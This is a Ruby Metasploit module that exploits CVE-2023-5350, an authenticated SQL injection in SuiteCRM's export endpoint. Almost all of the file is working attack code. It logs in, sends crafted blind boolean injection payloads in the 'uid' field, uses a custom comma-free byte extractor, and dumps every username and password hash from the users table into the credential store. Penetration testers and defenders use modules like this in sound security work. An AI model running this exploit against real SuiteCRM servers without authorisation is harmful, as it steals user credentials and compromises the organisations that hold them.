##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::SQLi
  include Msf::Exploit::Remote::HttpClient

  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SuiteCRM authenticated SQL injection in export functionality',
        'Description' => %q{
          This module exploits an authenticated SQL injection in SuiteCRM in versions before 7.12.6. The vulnerability
          allows an authenticated attacker to send specially crafted requests to the export entry point of the application in order
          to retrieve all the usernames and their associated password from the database.
        },
        'Author' => [
          'Exodus Intelligence', # Advisory
          'jheysel-r7', # poc + msf module
          'Redouane NIBOUCHA <rniboucha@yahoo.fr>' # sql injection help
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2023-5350'],
          ['URL', 'https://blog.exodusintel.com/2022/06/09/salesagility-suitecrm-export-request-sql-injection-vulnerability/'],
          ['URL', 'https://docs.suitecrm.com/admin/releases/7.12.x/#_7_12_6']
        ],
        'Actions' => [
          ['Dump credentials', { 'Description' => 'Dumps usernames and passwords from the users table' }]
        ],
        'DefaultAction' => 'Dump credentials',
        'DisclosureDate' => '2022-05-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        },
        'Privileged' => true
      )
    )
    register_options [
      OptInt.new('COUNT', [false, 'Number of users to enumerate (0 for all)', 3]),
      OptString.new('USERNAME', [true, 'Username of user', '']),
      OptString.new('PASSWORD', [true, 'Password for user', '']),
    ]
  end

  def check
    authenticated = authenticate
    return Exploit::CheckCode::Unknown('Unable to authenticate to SuiteCRM') unless authenticated

    res = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => normalize_uri(target_uri, 'index.php'),
        'keep_cookies' => true,
        'vars_get' => {
          'module' => 'Home',
          'action' => 'About'
        }
      }
    )

    return Exploit::CheckCode::Unknown('The SuiteCRM version page did not respond') unless res
    return Exploit::CheckCode::Unknown("The SuiteCRM version page returned HTTP #{res.code}") unless res.code == 200
    return Exploit::CheckCode::Unknown('The SuiteCRM version page has no response body') unless res.body

    # The About page also displays SugarCRM's version; inspect only SuiteCRM's
    # own element, retaining localized labels and optional custom-build text.
    version_text = res.get_html_document.at_css('#about_header > b')&.text
    version_number = version_text&.match(/\A\D*(\d+(?:\.\d+)+)(?=[[:space:]]|\z)/)&.[](1)
    return Exploit::CheckCode::Unknown('Could not determine the SuiteCRM version from the About page') unless version_number

    version = Rex::Version.new(version_number)
    print_status "Version detected: #{version}"

    return Exploit::CheckCode::Appears("SuiteCRM version #{version} appears to be vulnerable") if version <= Rex::Version.new('7.12.5')

    Exploit::CheckCode::Safe("SuiteCRM version #{version} is not vulnerable")
  rescue Rex::ConnectionError => e
    elog('SuiteCRM check request failed', error: e)
    Exploit::CheckCode::Unknown("Could not complete the SuiteCRM check: #{e.message}")
  end

  def authenticate
    print_status("Authenticating as #{datastore['USERNAME']}")
    initial_req = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => normalize_uri(target_uri, 'index.php'),
        'keep_cookies' => true,
        'vars_get' => {
          'module' => 'Users',
          'action' => 'Login'
        }
      }
    )

    return false unless initial_req && initial_req.code == 200 && initial_req.body.include?('SuiteCRM') && initial_req.get_cookies.include?('sugar_user_theme=')

    login = send_request_cgi(
      {
        'method' => 'POST',
        'uri' => normalize_uri(target_uri, 'index.php'),
        'keep_cookies' => true,
        'vars_post' => {
          'module' => 'Users',
          'action' => 'Authenticate',
          'return_module' => 'Users',
          'return_action' => 'Login',
          'user_name' => datastore['USERNAME'],
          'username_password' => datastore['PASSWORD'],
          'Login' => 'Log In'
        }
      }
    )

    return false unless login && login.code == 302 && login.headers['Location'] == 'index.php?module=Home&action=index' && login.get_cookies.include?('sugar_user_theme=')

    res = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => normalize_uri(target_uri, 'index.php'),
        'keep_cookies' => true,
        'vars_get' => {
          'module' => 'Administration',
          'action' => 'index'
        }
      }
    )

    if res && res.code == 200 && res.body.include?('SuiteCRM') && res.get_cookies.include?('sugar_user_theme=') && res.body.include?('SUGAR.unifiedSearchAdvanced')
      print_good("Authenticated as: #{datastore['USERNAME']}")
      true
    else
      print_error("Failed to authenticate as: #{datastore['USERNAME']}")
      false
    end
  end

  # This module sends this same request multiple times. In order to reduce code it has been moved it into it's owm method
  def send_injection_request_cgi(payload)
    res = send_request_cgi({
      'method' => 'POST',
      'keep_cookies' => true,
      'uri' => normalize_uri(target_uri.path, 'index.php?entryPoint=export'),
      'encode_params' => false,
      'vars_post' => {
        'uid' => payload,
        'module' => 'Accounts',
        'action' => 'index'
      }
    })

    if res&.code != 200
      fail_with(Failure::UnexpectedReply, "The server did not respond to the request with the payload: #{payload}")
    end
    content_type = res.headers['Content-Type'].to_s.split(';', 2).first.to_s.strip.downcase
    unless content_type == 'text/comma-separated-values'
      fail_with(Failure::UnexpectedReply, 'SuiteCRM export did not return CSV; verify Account access and server logs')
    end
    res
  end

  # @return an array of usernames
  def get_user_names(sqli)
    count = datastore['COUNT']
    count = 0 if count.nil?
    unless count.is_a?(Integer) && count >= 0
      fail_with(Failure::BadConfig, 'COUNT must be zero or greater (0 for all users)')
    end

    print_status 'Fetching Users, please wait...'
    # Extract individual HEX rows to preserve names without GROUP_CONCAT's
    # server-side truncation limit. Bound selection before per-row extraction.
    query = 'select distinct user_name from users order by user_name'
    query << " limit #{count}" if count.positive?
    user_count = sqli.run_sql("select count(user_name) from (#{query}) suitecrm_users")
    unless user_count.is_a?(String) && user_count.match?(/\A\d+\z/)
      fail_with(Failure::UnexpectedReply, 'Username extraction did not return a valid user count')
    end

    user_count.to_i.times.map do |index|
      encoded = sqli.run_sql("select hex(user_name) from (#{query}) suitecrm_users where user_name is not null order by user_name limit 1 offset #{index}")
      fail_with(Failure::UnexpectedReply, 'Username extraction did not return a string') unless encoded.is_a?(String)
      unless encoded.match?(/\A(?:[0-9a-fA-F]{2})+\z/)
        fail_with(Failure::UnexpectedReply, 'Username extraction returned malformed hexadecimal data')
      end
      username = Rex::Text.hex_to_raw(encoded).force_encoding(::Encoding::UTF_8)
      fail_with(Failure::UnexpectedReply, 'Username extraction returned invalid UTF-8 data') unless username.valid_encoding?

      username
    end
  end

  # Use blind boolean SQL injection to determine the user_hashes of given usernames
  def get_user_hashes(sqli, users)
    print_status 'Fetching Hashes, please wait...'
    hashes = []
    number_of_users = users.size
    users.each_with_index do |username, index|
      hash = sqli.run_sql("select user_hash from users where user_name=0x#{Rex::Text.to_hex(username, '')}")
      hashes << [username, hash]
      print_good "(#{index + 1}/#{number_of_users}) Username : #{username} ; Hash : #{hash}"
      create_credential({
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: username,
        private_type: :nonreplayable_hash,
        jtr_format: Metasploit::Framework::Hashes.identify_hash(hash),
        private_data: hash,
        service_name: 'SuiteCRM',
        address: datastore['RHOSTS'],
        port: datastore['RPORT'],
        protocol: 'tcp',
        status: Metasploit::Model::Login::Status::UNTRIED
      })
    end
    hashes
  end

  def init_sqli
    wrong_resp_length = send_injection_request_cgi(',\\,))+AND+1=2;+--+')&.body&.length
    fail_with(Failure::UnexpectedReply, 'The server responded unexpectedly to a request sent with uid: ",\\,))+AND+1=2;+--+"') unless wrong_resp_length
    sqli = create_sqli(dbms: MySQLi::BooleanBasedBlind, opts: { hex_encode_strings: true }) do |payload|
      # SuiteCRM HTML-encodes angle brackets. The shared detector compares a
      # nonnegative byte length, so express its predicate without a raw >.
      if (comparison = payload.match(/\A(length\(cast\(\(.*\) as binary\)\))>(\d+)\z/m))
        payload = "#{comparison[1]} NOT BETWEEN 0 AND #{comparison[2]}"
      end
      fail_with(Failure::BadConfig, 'comma in payload') if payload.include?(',')
      resp_length = send_injection_request_cgi(",\\,))+OR+(#{payload});+--+")&.body&.length
      resp_length != wrong_resp_length
    end

    # The shared length detector already generates comma-free SQL. Only byte
    # extraction needs an alternate SUBSTR grammar for this endpoint.
    def sqli.blind_dump_data(query, length, _known_bits, _bits_to_guess, _timebased)
      length.times.map do |index|
        lower = 0
        upper = 255
        while lower < upper
          middle = (lower + upper) / 2
          condition = "ascii(substr(cast((#{query}) as binary) from #{index + 1} for 1)) NOT BETWEEN 0 AND #{middle}"
          if blind_request(condition)
            lower = middle + 1
          else
            upper = middle
          end
        end
        lower.chr(::Encoding::BINARY)
      end.join
    end

    sqli
  end

  def run
    unless datastore['AutoCheck']
      authenticated = authenticate
      fail_with(Failure::NoAccess, 'Unable to authenticate to SuiteCRM') unless authenticated
    end

    sqli = init_sqli
    users = get_user_names(sqli)

    user_table = Rex::Text::Table.new(
      'Header' => 'SuiteCRM User Names',
      'Indent' => 1,
      'Columns' => ['Username']
    )

    users.each do |user|
      user_table << [user]
    end

    print_line user_table.to_s
    creds = get_user_hashes(sqli, users)
    creds_table = Rex::Text::Table.new(
      'Header' => 'SuiteCRM User Credentials',
      'Indent' => 1,
      'Columns' => ['Username', 'Hash']
    )

    creds.each do |cred|
      creds_table << [cred[0], cred[1]]
    end
    print_line creds_table.to_s
  end
end
